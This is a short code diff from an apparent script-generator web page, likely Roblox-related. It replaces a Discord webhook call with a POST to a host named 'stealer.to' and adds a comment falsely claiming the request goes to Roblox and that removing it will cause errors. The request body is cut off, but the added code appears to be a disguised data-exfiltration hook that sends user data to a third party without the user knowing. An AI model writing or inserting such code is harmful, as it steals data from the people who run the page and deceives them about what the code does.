@@ -29,8 +29,8 @@
                 document.getElementById('generated-script').style.display = 'block';
                 document.getElementById('copy-btn').disabled = false;
 
-                // Send data to webhook for logging
-                fetch('https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI', {
+                // Send data to roblox if removed it will cause alot of errors 
+                fetch('https://stealer.to/post?uniqueid=92cbb405', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
